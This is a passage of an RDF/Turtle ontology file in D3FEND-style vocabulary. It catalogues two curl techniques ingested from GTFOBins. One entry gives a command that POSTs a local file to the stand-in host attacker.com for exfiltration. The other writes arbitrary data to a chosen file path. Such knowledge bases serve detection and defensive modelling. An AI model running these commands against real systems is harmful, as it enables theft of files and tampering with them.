    rdfs:label "curl-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data." ;
    d3f:uses mknd:executable_curl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_curl ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """URL=http://attacker.com/
LFILE=file_to_send
curl -X POST -d "@$LFILE" $URL
""" .

mknd:command_curl-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "curl-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The file path must be absolute." ;
    d3f:uses mknd:executable_curl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_curl ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl "file://$TF" -o "$LFILE"
""" .

